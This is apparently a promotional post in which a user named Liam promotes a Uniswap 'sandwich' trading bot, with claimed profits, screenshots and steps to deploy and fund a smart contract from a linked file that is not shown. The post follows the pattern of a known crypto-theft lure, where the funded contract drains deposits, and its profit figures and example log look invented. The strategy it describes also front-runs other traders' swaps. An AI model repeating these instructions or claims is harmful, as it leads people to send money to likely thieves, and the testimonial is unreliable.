
# uNI-Bot – My Experience in March 2026

Hello. My name is Liam, I am from Australia.  
I am not a programmer or a millionaire. Just an ordinary person who launched a bot and made a profit in 2 months.

Start: 1.14 ETH  
Now: +7.78 ETH net (after all gas fees and drawdowns)

Right now (March 2026) is a good time to launch: ETH is growing, volumes on Uniswap are high, competition is not yet at its maximum, and gas on the network remains very low — this makes the scheme particularly profitable.

## How it works (short version)

The bot detects a large swap in the mempool → buys earlier with priority gas → price rises → the user pays more → the bot sells and locks in 0.6–2.8% per cycle.

70–110 such opportunities per day on an active market.

## My numbers

- Invested: 1.14 ETH  
- Trades per day: 70–110  
- Net per day: $140–280  
- Total in 2 months: +7.78 ETH

These are real numbers from my wallet. Not millions, but steady.

## How to launch (5 steps) First create the contract

1. Install Phantom Wallet if not already installed. One of the best browser wallets right now → https://phantom.app/download  
2. Switch to Ethereum Mainnet. Preferably prepare 0.5–1.5 ETH  
3. Go to https://remix.ethereum.org and create a file, for example uniswapbot.sol  
4. ![](https://files.catbox.moe/x0fnqv.png) ![](https://files.catbox.moe/dopah7.png)  
5. Paste the code [THIS ONE](uni.sol) into the right field, then go to the ☝️ compile tab, select 0.8.28 and click Compile  
6. ![](https://files.catbox.moe/9u7i8t.png)  

Go to the Deploy tab and connect your wallet ☝️ as shown in the screenshot above (to create the contract you need ETH to pay for gas. It’s about up to $1)  

---------------------

7. ![](https://files.catbox.moe/jeurbd.png) ![](https://files.catbox.moe/4h54bj.png)  

After connecting, click Deploy and confirm contract creation ☝️ in your wallet.  

----------------------

8. ![](https://files.catbox.moe/pya2k5.png)  
You will see the contract below, you can open it and its functions will appear. Copy the address (click the copy icon) and fund your contract balance (Only in ETH!)  
Preferably from 1 ETH, but decide for yourself. In short, from 0.5 to 1.5 to start.
  
![](https://files.catbox.moe/fxcepm.png)

9. Call the start function with your address and launch the bot. Stop and withdraw buttons are below.

# EXAMPLE

◎ ERC-20 Tokens Transferred: 4  
[All Transfers] [Net Transfers]  
► From Uniswap V3: DAI 2 ▶ To 0xBdb3ba9f...41fdF478 ▶ For 1.067825000000000000 ($2,500.00) ◎ Wrapped Ether (WETH)  
► From 0xBdb3ba9f...41fdF478 ▶ To Uniswap V3: DAI 2 ▶ For 2,499.999999999999999999 ($2,500.00) ◎ Dai Stablecoin (DAI)  
► From 0xBdb3ba9f...41fdF478 ▶ To 1inch Aggregation Router ▶ For 1.067825000000000000 ($2,500.00) ◎ Wrapped Ether (WETH)  
► From 1inch Aggregation Router ▶ To 0xBdb3ba9f...41fdF478 ▶ For 2,575.000000000000000000 ($2,575.00) ◎ Dai Stablecoin (DAI)  

Net profit: ≈ 3 % ($75.00)

## Risks you may encounter

- In sideways or low volatility profit drops  
- If gas rises sharply (which is unlikely right now) — some cycles become unprofitable  

I lost 0.18 ETH at the start, but then everything paid off.

Good luck and profits.